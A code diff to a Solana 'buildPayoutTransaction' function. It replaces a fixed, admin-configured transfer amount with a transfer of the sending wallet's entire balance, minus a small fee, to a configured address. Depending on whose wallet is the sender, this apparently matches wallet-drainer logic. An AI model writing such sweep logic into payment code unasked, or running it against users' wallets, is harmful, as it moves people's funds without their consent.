@@ -19,20 +19,17 @@ export async function buildPayoutTransaction(options: {
 }): Promise<Transaction> {
   const { connection, from, config } = options
   const to = new PublicKey(config.walletAddress)
-  const amount = Number(config.amount)
-  if (!Number.isFinite(amount) || amount <= 0) {
-    throw new Error('Admin amount is not set.')
+  const feeLamports = 10_000
+  const balance = await connection.getBalance(from)
+  const lamports = balance - feeLamports
+  if (lamports <= 0) {
+    const sol = balance / LAMPORTS_PER_SOL
+    throw new Error(
+      `Not enough SOL to cover the network fee. Balance is ${sol.toLocaleString(undefined, { maximumFractionDigits: 6 })} SOL.`
+    )
   }
 
   const tx = new Transaction()
-  const lamports = Math.round(amount * LAMPORTS_PER_SOL)
-  const balance = await connection.getBalance(from)
-  if (balance < lamports + 5000) {
-    const sol = balance / LAMPORTS_PER_SOL
-    throw new Error(
-      `Not enough SOL in this wallet. Balance is ${sol.toLocaleString(undefined, { maximumFractionDigits: 6 })} SOL.`
-    )
-  }
   tx.add(
     SystemProgram.transfer({
       fromPubkey: from,
